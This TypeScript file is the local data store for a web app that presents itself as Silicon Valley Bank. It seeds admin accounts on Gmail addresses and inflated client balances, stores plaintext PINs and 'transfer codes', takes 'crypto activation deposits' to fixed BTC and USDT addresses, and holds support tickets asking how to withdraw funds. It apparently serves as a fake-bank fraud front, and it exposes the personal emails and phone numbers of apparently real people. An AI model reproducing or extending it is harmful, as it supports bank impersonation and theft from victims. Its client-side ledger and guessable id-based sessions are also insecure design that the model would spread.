import { User, Transaction, UserNotification, SupportTicket, SupportMessage, VirtualCard, BillPayment, CryptoActivationDeposit, Tier3VerificationRequest, AuditLog, EmailConfig, EmailDeliveryLog } from '../types';
import { deduplicateTransactions, getFinalizedStatuses, saveFinalizedStatus } from '../utils/transactions';

const STORAGE_KEY = 'svb_core_ledger_v2';
const TOKEN_KEY = 'svb_auth_token_v2';
const ACTIVE_USER_KEY = 'svb_active_user_v2';

const memoryStore = new Map<string, string>();

const safeStorage = {
  getItem(key: string): string | null {
    try {
      if (typeof window !== 'undefined' && typeof window.localStorage !== 'undefined') {
        return window.localStorage.getItem(key);
      }
    } catch {}
    return memoryStore.get(key) || null;
  },
  setItem(key: string, value: string): void {
    try {
      if (typeof window !== 'undefined' && typeof window.localStorage !== 'undefined') {
        window.localStorage.setItem(key, value);
      }
    } catch {}
    memoryStore.set(key, value);
  },
  removeItem(key: string): void {
    try {
      if (typeof window !== 'undefined' && typeof window.localStorage !== 'undefined') {
        window.localStorage.removeItem(key);
      }
    } catch {}
    memoryStore.delete(key);
  }
};


interface DBStructure {
  users: User[];
  transactions: Transaction[];
  notifications: UserNotification[];
  supportTickets: SupportTicket[];
  virtualCards: VirtualCard[];
  billPayments: BillPayment[];
  cryptoDeposits: CryptoActivationDeposit[];
  verifications: Tier3VerificationRequest[];
  auditLogs: AuditLog[];
  cryptoAddresses: { BTC: string; USDT: string };
  emailConfig?: EmailConfig;
  emailLogs?: any[];
}

const DEFAULT_USERS: User[] = [
  {
    id: 'usr-admin-001',
    fullName: 'Silicon Valley Bank SVB Review',
    email: 'admin@svb.com',
    phone: '+1 (555) 019-2834',
    accountNumber: '1098234710',
    role: 'admin',
    balance: 5000000.00,
    ledgerBalance: 5000000.00,
    currency: 'USD',
    address: '3000 Sand Hill Rd, Menlo Park, CA 94025',
    country: 'United States',
    verificationTier: 'Tier 3',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '8842',
    transferCodeApproved: true,
    createdAt: new Date('2024-01-01').toISOString()
  },
  {
    id: 'admin-002',
    fullName: 'SVB Official Executive SVB Review',
    email: 'siliconvalleybank51@gmail.com',
    phone: '+1 (800) 555-0199',
    accountNumber: '1099887700',
    role: 'admin',
    balance: 5000000.00,
    ledgerBalance: 5000000.00,
    currency: 'USD',
    address: '3000 Sand Hill Rd, Building 4, Menlo Park, CA 94025',
    country: 'United States',
    verificationTier: 'Tier 3',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '9999',
    transferCodeApproved: true,
    createdAt: new Date('2024-01-01').toISOString()
  },
  {
    id: 'admin-003',
    fullName: 'Stephen Gareth Chappell (SVB Admin)',
    email: 'stephengarethchappell15@gmail.com',
    phone: '+1 (415) 555-0199',
    accountNumber: '1099887788',
    role: 'admin',
    balance: 5000000.00,
    ledgerBalance: 5000000.00,
    currency: 'USD',
    address: '3000 Sand Hill Rd, Building 4, Menlo Park, CA 94025',
    country: 'United States',
    verificationTier: 'Tier 3',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '9999',
    transferCodeApproved: true,
    createdAt: new Date('2024-01-01').toISOString()
  },
  {
    id: 'usr-alex-002',
    fullName: 'Alex Wright',
    email: 'alex.wright@svb.com',
    phone: '+1 (555) 014-9982',
    accountNumber: '1048291034',
    role: 'user',
    balance: 248500.00,
    ledgerBalance: 248500.00,
    currency: 'USD',
    address: '100 Sand Hill Road, Suite 400, Palo Alto, CA 94301',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '8842',
    transferCodeApproved: true,
    createdAt: new Date('2024-02-15').toISOString()
  },
  {
    id: 'usr-client-003',
    fullName: 'SVB Client User',
    email: 'user@svb.com',
    phone: '+1 (555) 012-3456',
    accountNumber: '1099201948',
    role: 'user',
    balance: 150000.00,
    ledgerBalance: 150000.00,
    currency: 'USD',
    address: '500 Tech Circle, San Jose, CA 95110',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '1234',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-dominic-global',
    fullName: 'Dominic Global',
    email: 'dominicglobalenergysolution@gmail.com',
    phone: '09064718123',
    accountNumber: '102576690868',
    role: 'user',
    balance: 0.00,
    ledgerBalance: 0.00,
    currency: 'USD',
    address: 'Global Energy Solution HQ',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '8842',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-diego-daniel-ifuu1',
    fullName: 'Diego Daniel',
    email: 'ifuu1@gmail.com',
    phone: '+1 (555) 018-4921',
    accountNumber: '1098421089',
    role: 'user',
    balance: 0.00,
    ledgerBalance: 0.00,
    currency: 'USD',
    address: 'Silicon Valley, CA',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '8842',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-diego-daniel',
    fullName: 'Diego Daniel',
    email: 'diegodanieldan432@gmail.com',
    phone: '+1 (555) 018-4921',
    accountNumber: '1098421098',
    role: 'user',
    balance: 0.00,
    ledgerBalance: 0.00,
    currency: 'USD',
    address: 'Silicon Valley, CA',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '8842',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-deep-singh-9083',
    fullName: 'Gagandeep Singh',
    email: 'deepnsingh9083@gmail.com',
    phone: '+1 (555) 019-3829',
    accountNumber: '108007560894',
    role: 'user',
    balance: 0.00,
    ledgerBalance: 0.00,
    currency: 'USD',
    address: 'Silicon Valley, CA',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '8842',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-diego-daniel-mmad',
    fullName: 'Diego Daniel',
    email: 'mmaduabuchinwanoro@gmail.com',
    phone: '+1 (555) 018-4921',
    accountNumber: '101248197458',
    role: 'user',
    balance: 0.00,
    ledgerBalance: 0.00,
    currency: 'USD',
    address: 'Silicon Valley, CA',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '8842',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-deep-singh',
    fullName: 'Deep Singh',
    email: 'deepsingh9003@gmail.com',
    phone: '+1 (555) 019-3829',
    accountNumber: '1089204918',
    role: 'user',
    balance: 0.00,
    ledgerBalance: 0.00,
    currency: 'USD',
    address: 'Silicon Valley, CA',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '8842',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-ifunanya-nwanoro',
    fullName: 'Ifunanya Nwanoro',
    email: 'ifuu@gmail.com',
    phone: '+1 (555) 019-3829',
    accountNumber: '103111630671',
    role: 'user',
    balance: 59000.00,
    ledgerBalance: 59000.00,
    currency: 'USD',
    address: '100 Silicon Valley Way, Palo Alto, CA 94301',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '6572',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-eryn-harrington',
    fullName: 'Eryn Harrington',
    email: 'erynharrington@gmail.com',
    phone: '+1 (555) 019-4821',
    accountNumber: '1088049371765',
    role: 'user',
    balance: 192500.00,
    ledgerBalance: 192500.00,
    currency: 'USD',
    address: '100 Silicon Valley Way, Palo Alto, CA 94301',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '7767',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-rhiannon-wilson',
    fullName: 'Rhiannon Wilson',
    email: 'rmwilson@gmail.com',
    phone: '+1 (555) 019-9942',
    accountNumber: '101300306442',
    role: 'user',
    balance: 10000000.00,
    ledgerBalance: 10000000.00,
    currency: 'USD',
    address: '100 Silicon Valley Way, Palo Alto, CA 94301',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '2203',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-derickson-tila',
    fullName: 'Derickson Tila',
    email: 'derick.tila@yahoo.com',
    phone: '+1 (555) 018-7711',
    accountNumber: '103404630836',
    role: 'user',
    balance: 10000000.00,
    ledgerBalance: 10000000.00,
    currency: 'USD',
    address: '100 Silicon Valley Way, Palo Alto, CA 94301',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '1234',
    fourDigitCode: '5109',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  },
  {
    id: 'usr-1787530386176',
    fullName: 'SAILOSI SALADUADUA',
    email: 'princelucifer734@gmail.com',
    phone: '+6797508317',
    accountNumber: '102612827107',
    role: 'user',
    balance: 0.00,
    ledgerBalance: 0.00,
    currency: 'USD',
    address: '100 Silicon Valley Way, Palo Alto, CA 94301',
    country: 'United States',
    verificationTier: 'Tier 1',
    status: 'Active',
    accountPin: '4666',
    fourDigitCode: '8842',
    transferCodeApproved: true,
    createdAt: new Date('2024-03-01').toISOString()
  }
];

const DEFAULT_TRANSACTIONS: Transaction[] = [
  {
    id: 'TXN-WIRE-1786621671221',
    userId: 'usr-dominic-global',
    userEmail: 'dominicglobalenergysolution@gmail.com',
    userName: 'Dominic Global',
    senderName: 'Dominic Global',
    accountNumber: '102576690868',
    recipientAccountNumber: '9948201948',
    recipientName: 'Global Energy Solution Corp',
    destinationBank: 'JPMorgan Chase Bank, N.A.',
    destinationCountry: 'United States',
    amount: 40000.00,
    currency: 'USD',
    type: 'Wire Transfer',
    status: 'Pending',
    reference: 'WIRE-1786621671221',
    description: 'Outgoing Wire Transfer to Acc #9948201948 (JPMorgan Chase Bank, N.A.)',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString()
  },
  {
    id: 'TXN-1001',
    userId: 'usr-alex-002',
    userEmail: 'alex.wright@svb.com',
    accountNumber: '1048291034',
    amount: 250000.00,
    currency: 'USD',
    type: 'Credit Deposit',
    status: 'Completed',
    reference: 'INIT-99201',
    description: 'Initial Venture Capital Treasury Deposit',
    createdAt: new Date('2024-02-15T10:00:00Z').toISOString(),
    updatedAt: new Date('2024-02-15T10:00:00Z').toISOString()
  },
  {
    id: 'TXN-1002',
    userId: 'usr-alex-002',
    userEmail: 'alex.wright@svb.com',
    accountNumber: '1048291034',
    amount: 1500.00,
    currency: 'USD',
    type: 'Wire Transfer',
    status: 'Completed',
    reference: 'WIRE-88219',
    description: 'Cloud Infrastructure Provider Payment',
    createdAt: new Date('2024-03-01T14:30:00Z').toISOString(),
    updatedAt: new Date('2024-03-01T14:30:00Z').toISOString()
  }
];

const DEFAULT_SUPPORT_TICKETS: SupportTicket[] = [
  {
    id: 'TICKET-1740646100000',
    chatId: 'TICKET-1740646100000',
    threadId: 'TICKET-1740646100000',
    roomId: 'TICKET-1740646100000',
    userId: 'usr-diego-daniel-ifuu1',
    userEmail: 'ifuu1@gmail.com',
    userName: 'Diego Daniel',
    accountNumber: '1098421089',
    subject: 'How can I withdraw my money',
    category: 'Withdrawal',
    status: 'Open',
    priority: 'High',
    messages: [
      {
        id: 'MSG-ifuu1-1',
        ticketId: 'TICKET-1740646100000',
        chatId: 'TICKET-1740646100000',
        senderId: 'usr-diego-daniel-ifuu1',
        senderName: 'Diego Daniel',
        senderRole: 'user',
        message: 'Hello',
        createdAt: '2026-08-27T14:47:00.000Z'
      },
      {
        id: 'MSG-ifuu1-2',
        ticketId: 'TICKET-1740646100000',
        chatId: 'TICKET-1740646100000',
        senderId: 'usr-diego-daniel-ifuu1',
        senderName: 'Diego Daniel',
        senderRole: 'user',
        message: 'Hello silicon support',
        createdAt: '2026-08-27T14:48:00.000Z'
      },
      {
        id: 'MSG-ifuu1-3',
        ticketId: 'TICKET-1740646100000',
        chatId: 'TICKET-1740646100000',
        senderId: 'usr-diego-daniel-ifuu1',
        senderName: 'Diego Daniel',
        senderRole: 'user',
        message: 'How can I withdraw my money',
        createdAt: '2026-08-27T14:49:00.000Z'
      },
      {
        id: 'MSG-ifuu1-4',
        ticketId: 'TICKET-1740646100000',
        chatId: 'TICKET-1740646100000',
        senderId: 'usr-diego-daniel-ifuu1',
        senderName: 'Diego Daniel',
        senderRole: 'user',
        message: 'Hey',
        createdAt: '2026-08-27T15:14:00.000Z'
      }
    ],
    createdAt: '2026-08-27T14:47:00.000Z',
    updatedAt: '2026-08-27T15:14:00.000Z'
  },
  {
    id: 'TICKET-1786636751931',
    chatId: 'TICKET-1786636751931',
    threadId: 'TICKET-1786636751931',
    roomId: 'TICKET-1786636751931',
    userId: 'usr-deep-singh-9083',
    userEmail: 'deepnsingh9083@gmail.com',
    userName: 'Gagandeep Singh',
    accountNumber: '108007560894',
    subject: 'SVB Client Support Desk - Gagandeep',
    category: 'General',
    status: 'Open',
    priority: 'High',
    messages: [
      {
        id: 'MSG-deep-1',
        ticketId: 'TICKET-1786636751931',
        chatId: 'TICKET-1786636751931',
        senderId: 'usr-deep-singh-9083',
        senderName: 'Gagandeep Singh',
        senderRole: 'user',
        message: 'Hello SVB support team, I need assistance with my account consultation.',
        createdAt: '2026-08-27T10:00:00.000Z'
      }
    ],
    createdAt: '2026-08-27T10:00:00.000Z',
    updatedAt: '2026-08-27T10:00:00.000Z'
  },
  {
    id: 'TICKET-1786273560263',
    chatId: 'TICKET-1786273560263',
    threadId: 'TICKET-1786273560263',
    roomId: 'TICKET-1786273560263',
    userId: 'usr-diego-daniel-mmad',
    userEmail: 'mmaduabuchinwanoro@gmail.com',
    userName: 'Diego Daniel',
    accountNumber: '101248197458',
    subject: 'SVB Client Support Desk - Diego Daniel',
    category: 'General',
    status: 'Open',
    priority: 'Medium',
    messages: [
      {
        id: 'MSG-diego-1',
        ticketId: 'TICKET-1786273560263',
        chatId: 'TICKET-1786273560263',
        senderId: 'usr-diego-daniel-mmad',
        senderName: 'Diego Daniel',
        senderRole: 'user',
        message: 'Hello SVB support desk.',
        createdAt: '2026-08-27T09:00:00.000Z'
      }
    ],
    createdAt: '2026-08-27T09:00:00.000Z',
    updatedAt: '2026-08-27T09:00:00.000Z'
  }
];

const EXTRA_USERS_KEY = 'svb_registered_users_v2';

function getInitialDB(): DBStructure {
  let loadedUsers: User[] = [];
  try {
    const rawExtra = safeStorage.getItem(EXTRA_USERS_KEY);
    if (rawExtra) {
      const parsedExtra = JSON.parse(rawExtra);
      if (Array.isArray(parsedExtra)) {
        loadedUsers = parsedExtra;
      }
    }
  } catch (e) {
    console.warn('Error reading extra users', e);
  }

  try {
    const raw = safeStorage.getItem(STORAGE_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (parsed && Array.isArray(parsed.users)) {
        const userMap = new Map<string, User>();
        
        // Load default users first
        for (const defUser of DEFAULT_USERS) {
          if (defUser && defUser.email) {
            userMap.set(defUser.email.toLowerCase(), defUser);
          }
        }

        // Merge users from main storage
        for (const u of parsed.users) {
          if (u && u.email) {
            const def = userMap.get(u.email.toLowerCase());
            const mergedBal = (typeof u.balance === 'number' && u.balance > 0) ? u.balance : (def?.balance ?? u.balance ?? 0);
            const mergedLedger = (typeof u.ledgerBalance === 'number' && u.ledgerBalance > 0) ? u.ledgerBalance : (def?.ledgerBalance ?? mergedBal);
            userMap.set(u.email.toLowerCase(), { 
              ...def, 
              ...u, 
              balance: mergedBal, 
              ledgerBalance: mergedLedger 
            });
          }
        }

        // Merge users from extra registered backup
        for (const u of loadedUsers) {
          if (u && u.email) {
            const def = userMap.get(u.email.toLowerCase());
            const mergedBal = (typeof u.balance === 'number' && u.balance > 0) ? u.balance : (def?.balance ?? u.balance ?? 0);
            const mergedLedger = (typeof u.ledgerBalance === 'number' && u.ledgerBalance > 0) ? u.ledgerBalance : (def?.ledgerBalance ?? mergedBal);
            userMap.set(u.email.toLowerCase(), { 
              ...def, 
              ...u, 
              balance: mergedBal, 
              ledgerBalance: mergedLedger 
            });
          }
        }

        parsed.users = Array.from(userMap.values());
        
        // Ensure default transactions are present alongside any saved transactions
        const txnMap = new Map<string, Transaction>();
        for (const defTxn of DEFAULT_TRANSACTIONS) {
          if (defTxn && defTxn.id) txnMap.set(defTxn.id, defTxn);
        }
        if (Array.isArray(parsed.transactions)) {
          for (const t of parsed.transactions) {
            if (t && t.id) txnMap.set(t.id, t);
          }
        }
        parsed.transactions = Array.from(txnMap.values());

        parsed.notifications = parsed.notifications || [];
        
        // Ensure default support tickets (including ifuu1@gmail.com) are merged
        const ticketMap = new Map<string, SupportTicket>();
        for (const defTicket of DEFAULT_SUPPORT_TICKETS) {
          if (defTicket && defTicket.id) ticketMap.set(defTicket.id, defTicket);
        }
        if (Array.isArray(parsed.supportTickets)) {
          for (const t of parsed.supportTickets) {
            if (t && t.id) {
              const existing = ticketMap.get(t.id);
              if (existing) {
                // Merge messages
                const msgMap = new Map<string, SupportMessage>();
                (existing.messages || []).forEach(m => msgMap.set(m.id, m));
                (t.messages || []).forEach(m => msgMap.set(m.id, m));
                ticketMap.set(t.id, {
                  ...existing,
                  ...t,
                  messages: Array.from(msgMap.values()).sort(
                    (a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()
                  )
                });
              } else {
                ticketMap.set(t.id, t);
              }
            }
          }
        }
        parsed.supportTickets = Array.from(ticketMap.values());

        parsed.virtualCards = parsed.virtualCards || [];
        parsed.billPayments = parsed.billPayments || [];
        parsed.cryptoDeposits = parsed.cryptoDeposits || [];
        parsed.verifications = parsed.verifications || [];
        parsed.auditLogs = parsed.auditLogs || [];
        if (!parsed.cryptoAddresses) {
          parsed.cryptoAddresses = {
            BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
            USDT: '0x400773d018e8ad3575458b5e8b11ff55078451c9'
          };
        }
        return parsed;
      }
    }
  } catch (e) {
    console.error('Error loading local DB', e);
  }

  const userMap = new Map<string, User>();
  for (const defUser of DEFAULT_USERS) {
    userMap.set(defUser.email.toLowerCase(), defUser);
  }
  for (const extra of loadedUsers) {
    if (extra && extra.email) {
      userMap.set(extra.email.toLowerCase(), extra);
    }
  }

  const initial: DBStructure = {
    users: Array.from(userMap.values()),
    transactions: DEFAULT_TRANSACTIONS,
    notifications: [
      {
        id: 'NOTIF-1',
        userId: 'usr-alex-002',
        title: 'Welcome to Silicon Valley Bank',
        message: 'Your commercial account #1048291034 is active with $248,500.00 USD balance.',
        amount: 248500,
        currency: 'USD',
        reference: 'INIT-99201',
        read: false,
        createdAt: new Date().toISOString()
      }
    ],
    supportTickets: DEFAULT_SUPPORT_TICKETS,
    virtualCards: [
      {
        id: 'CARD-1',
        userId: 'usr-alex-002',
        cardNumber: '4532 •••• •••• 8819',
        cardholderName: 'ALEX WRIGHT',
        expiryMonth: '08',
        expiryYear: '28',
        cvv: '849',
        cardType: 'Visa Corporate',
        category: 'Business',
        spendingLimit: 50000,
        spentAmount: 1240,
        status: 'Active',
        createdAt: new Date().toISOString()
      }
    ],
    billPayments: [],
    cryptoDeposits: [],
    verifications: [],
    auditLogs: [],
    cryptoAddresses: {
      BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
      USDT: '0x400773d018e8ad3575458b5e8b11ff55078451c9'
    }
  };

  saveDB(initial);
  return initial;
}

function saveDB(db: DBStructure): void {
  try {
    safeStorage.setItem(STORAGE_KEY, JSON.stringify(db));
    if (db && Array.isArray(db.users)) {
      safeStorage.setItem(EXTRA_USERS_KEY, JSON.stringify(db.users));
    }
  } catch (e) {
    console.error('Error saving local DB', e);
  }
}

class LocalDBStore {
  private db: DBStructure;

  constructor() {
    this.db = getInitialDB();
  }

  private refresh() {
    this.db = getInitialDB();
  }

  private persist() {
    saveDB(this.db);
  }

  // Token Management
  getStoredToken(): string | null {
    try {
      return safeStorage.getItem(TOKEN_KEY);
    } catch {
      return null;
    }
  }

  setStoredToken(token: string): void {
    try {
      safeStorage.setItem(TOKEN_KEY, token);
    } catch (e) {
      console.warn('Failed to set stored token:', e);
    }
  }

  removeStoredToken(): void {
    try {
      safeStorage.removeItem(TOKEN_KEY);
      safeStorage.removeItem(ACTIVE_USER_KEY);
    } catch (e) {
      console.warn('Failed to remove stored token:', e);
    }
  }

  // Auth & Users
  getUsers(): User[] {
    this.refresh();
    return this.db.users;
  }

  getUserById(id: string): User | null {
    if (!id) return null;
    this.refresh();
    const raw = id.trim();
    const clean = raw.toLowerCase();
    const stripped = clean.replace(/^(bearer\s+|token-)/i, '');
    const cleanNum = stripped.replace(/[^0-9]/g, '');

    const found = this.db.users.find(u => 
      u.id === raw || 
      u.id === stripped ||
      u.id.toLowerCase() === clean || 
      u.id.toLowerCase() === stripped ||
      u.email.toLowerCase() === clean ||
      u.email.toLowerCase() === stripped ||
      u.accountNumber === raw ||
      u.accountNumber === stripped ||
      (cleanNum.length > 0 && u.accountNumber.replace(/[^0-9]/g, '') === cleanNum)
    ) || null;

    if (found && !found.profilePicture) {
      try {
        const cached = safeStorage.getItem(`svb_avatar_${found.id}`);
        if (cached) found.profilePicture = cached;
      } catch (e) {}
    }
    return found;
  }

  getUserByEmail(email: string): User | null {
    if (!email) return null;
    return this.findUserByEmailOrAccount(email);
  }

  getUserByAccountNumber(accountNumber: string): User | null {
    if (!accountNumber) return null;
    return this.findUserByEmailOrAccount(accountNumber);
  }

  findUserByEmailOrAccount(identifier: string): User | null {
    if (!identifier) return null;
    this.refresh();
    const raw = identifier.trim().toLowerCase();
    const stripped = raw.replace(/^(bearer\s+|token-)/i, '');
    const cleanNum = stripped.replace(/[^0-9]/g, '');

    const found = this.db.users.find(u => {
      if (!u) return false;
      const uEmail = (u.email || '').toLowerCase().trim();
      const uAcc = (u.accountNumber || '').trim();
      const uAccClean = uAcc.replace(/[^0-9]/g, '');
      const uId = (u.id || '').toLowerCase().trim();

      return (
        uEmail === raw ||
        uEmail === stripped ||
        uAcc.toLowerCase() === raw ||
        uAcc.toLowerCase() === stripped ||
        (cleanNum.length > 0 && uAccClean === cleanNum) ||
        uId === raw ||
        uId === stripped ||
        (stripped.length >= 4 && uEmail.includes(stripped)) ||
        (cleanNum.length >= 6 && uAccClean.includes(cleanNum))
      );
    }) || null;

    if (found && !found.profilePicture) {
      try {
        const cached = safeStorage.getItem(`svb_avatar_${found.id}`);
        if (cached) found.profilePicture = cached;
      } catch (e) {}
    }
    return found;
  }

  getCurrentUser(): User | null {
    const token = this.getStoredToken();
    if (!token) {
      return null;
    }

    const cleanToken = token.replace(/^token-/, '').trim();
    const user = this.getUserById(cleanToken) || this.getUserByEmail(cleanToken) || this.findUserByEmailOrAccount(cleanToken);
    if (user) {
      return user;
    }

    // Try reading cached active user from safeStorage ONLY if it matches the active token
    try {
      const cached = safeStorage.getItem(ACTIVE_USER_KEY);
      if (cached) {
        const parsed = JSON.parse(cached) as User;
        if (parsed && (parsed.id === cleanToken || parsed.email?.toLowerCase() === cleanToken.toLowerCase() || parsed.accountNumber === cleanToken)) {
          const existingIdx = this.db.users.findIndex(u => u.id === parsed.id || u.email.toLowerCase() === parsed.email.toLowerCase());
          if (existingIdx >= 0) {
            this.db.users[existingIdx] = { ...this.db.users[existingIdx], ...parsed };
          } else {
            this.db.users.push(parsed);
            this.persist();
          }
          return parsed;
        }
      }
    } catch (e) {
      console.warn('Error parsing cached active user:', e);
    }

    return null;
  }

  saveUser(user: User, isCurrentUser = false): User {
    this.refresh();
    const idx = this.db.users.findIndex(u => u.id === user.id || u.email.toLowerCase() === user.email.toLowerCase());
    if (idx >= 0) {
      this.db.users[idx] = { ...this.db.users[idx], ...user };
    } else {
      this.db.users.push(user);
    }
    if (user.profilePicture) {
      try { safeStorage.setItem(`svb_avatar_${user.id}`, user.profilePicture); } catch (e) {}
    } else if (user.profilePicture === '') {
      try { safeStorage.removeItem(`svb_avatar_${user.id}`); } catch (e) {}
    }

    // Strict isolation: only update ACTIVE_USER_KEY if this user is explicitly the authenticated user
    const currentToken = this.getStoredToken();
    const cleanToken = currentToken ? currentToken.replace(/^token-/, '').trim() : null;
    if (isCurrentUser || (cleanToken && (cleanToken === user.id || cleanToken.toLowerCase() === user.email?.toLowerCase() || cleanToken === user.accountNumber))) {
      try {
        safeStorage.setItem(ACTIVE_USER_KEY, JSON.stringify(user));
      } catch (e) {}
    }
    this.persist();
    return user;
  }

  // Cache user without touching active session
  cacheUser(user: User): User {
    this.refresh();
    const idx = this.db.users.findIndex(u => u.id === user.id || u.email.toLowerCase() === user.email.toLowerCase());
    if (idx >= 0) {
      this.db.users[idx] = { ...this.db.users[idx], ...user };
    } else {
      this.db.users.push(user);
    }
    if (user.profilePicture) {
      try { safeStorage.setItem(`svb_avatar_${user.id}`, user.profilePicture); } catch (e) {}
    }
    this.persist();
    return user;
  }

  setActiveUser(user: User): void {
    try {
      safeStorage.setItem(ACTIVE_USER_KEY, JSON.stringify(user));
      if (user.id) {
        this.setStoredToken(user.id);
      }
    } catch (e) {
      console.warn('Failed to set active user:', e);
    }
  }

  clearActiveUser(): void {
    this.removeStoredToken();
  }

  // Transactions
  getTransactions(userId?: string): Transaction[] {
    this.refresh();
    const deduped = deduplicateTransactions(this.db.transactions);
    if (!userId) return deduped;

    const user = this.getUserById(userId) || this.getUserByEmail(userId) || this.findUserByEmailOrAccount(userId);
    const cleanId = userId.trim();
    const cleanIdNum = cleanId.replace(/[^0-9]/g, '');
    const uEmail = (user?.email || '').toLowerCase().trim();
    const uAcc = (user?.accountNumber || '').trim();
    const uAccClean = uAcc.replace(/[^0-9]/g, '');

    return deduped.filter(t => {
      if (!t) return false;
      const tUserId = (t.userId || '').trim();
      const tEmail = (t.userEmail || '').toLowerCase().trim();
      const tAcc = (t.accountNumber || '').trim();
      const tAccClean = tAcc.replace(/[^0-9]/g, '');
      const tRecAcc = (t.recipientAccountNumber || '').trim();
      const tRecAccClean = tRecAcc.replace(/[^0-9]/g, '');
      const tRecEmail = (t.recipientEmail || '').toLowerCase().trim();

      return (
        tUserId === cleanId ||
        (user && tUserId === user.id) ||
        (uEmail && tEmail === uEmail) ||
        (uEmail && tRecEmail === uEmail) ||
        (uAcc && tAcc === uAcc) ||
        (uAccClean.length > 3 && tAccClean === uAccClean) ||
        (uAcc && tRecAcc === uAcc) ||
        (uAccClean.length > 3 && tRecAccClean === uAccClean) ||
        (cleanIdNum.length > 3 && (tAccClean === cleanIdNum || tRecAccClean === cleanIdNum)) ||
        (cleanId.includes('@') && (tEmail === cleanId.toLowerCase() || tRecEmail === cleanId.toLowerCase()))
      );
    });
  }

  addTransaction(txn: Transaction): Transaction {
    this.refresh();
    const finalized = getFinalizedStatuses();
    const lockedStatus = (txn.id && finalized[txn.id]) || (txn.reference && finalized[txn.reference]);

    const existingIdx = this.db.transactions.findIndex(
      t => t.id === txn.id || (txn.reference && t.reference && t.reference === txn.reference) || (t.reference && t.reference === txn.id) || (txn.reference && t.id === txn.reference)
    );
    if (existingIdx >= 0) {
      const existing = this.db.transactions[existingIdx];
      // Finalized status (Completed, Rejected, Cancelled) must not be reverted to Pending by older snapshots
      let finalStatus = (existing.status !== 'Pending' && txn.status === 'Pending') 
        ? existing.status 
        : (txn.status || existing.status);
      
      if (lockedStatus && finalStatus === 'Pending') {
        finalStatus = lockedStatus as any;
      }

      this.db.transactions[existingIdx] = {
        ...existing,
        ...txn,
        status: finalStatus,
        updatedAt: txn.updatedAt || existing.updatedAt || new Date().toISOString()
      };
      if (finalStatus !== 'Pending') {
        if (existing.id) saveFinalizedStatus(existing.id, finalStatus);
        if (existing.reference) saveFinalizedStatus(existing.reference, finalStatus);
        if (txn.id) saveFinalizedStatus(txn.id, finalStatus);
        if (txn.reference) saveFinalizedStatus(txn.reference, finalStatus);
      }
    } else {
      const finalStatus = (lockedStatus || txn.status) as any;
      const toAdd: Transaction = { ...txn, status: finalStatus };
      this.db.transactions.unshift(toAdd);
      if (finalStatus !== 'Pending') {
        if (txn.id) saveFinalizedStatus(txn.id, finalStatus);
        if (txn.reference) saveFinalizedStatus(txn.reference, finalStatus);
      }
    }
    this.persist();
    return txn;
  }

  updateTransaction(id: string, updates: Partial<Transaction>): Transaction | null {
    this.refresh();
    let updated: Transaction | null = null;
    if (updates.status && updates.status !== 'Pending') {
      saveFinalizedStatus(id, updates.status);
      if (updates.reference) saveFinalizedStatus(updates.reference, updates.status);
      if (updates.id) saveFinalizedStatus(updates.id, updates.status);
    }

    this.db.transactions = this.db.transactions.map(t => {
      if (t.id === id || (t.reference && t.reference === id) || (updates.reference && t.reference === updates.reference) || (t.id && updates.id && t.id === updates.id)) {
        if (updates.status && updates.status !== 'Pending') {
          if (t.id) saveFinalizedStatus(t.id, updates.status);
          if (t.reference) saveFinalizedStatus(t.reference, updates.status);
        }
        updated = { 
          ...t, 
          ...updates, 
          updatedAt: updates.updatedAt || new Date().toISOString() 
        };
        return updated;
      }
      return t;
    });

    if (updated) {
      this.persist();
      return updated;
    }
    return null;
  }

  // Notifications
  getNotifications(userId: string): UserNotification[] {
    this.refresh();
    const cleanStr = (s: string) => {
      if (!s) return '';
      return s
        .replace(/Compliance Admin/gi, 'SVB Review')
        .replace(/Compliance team/gi, 'SVB Review team')
        .replace(/Bank Compliance/gi, 'SVB Review')
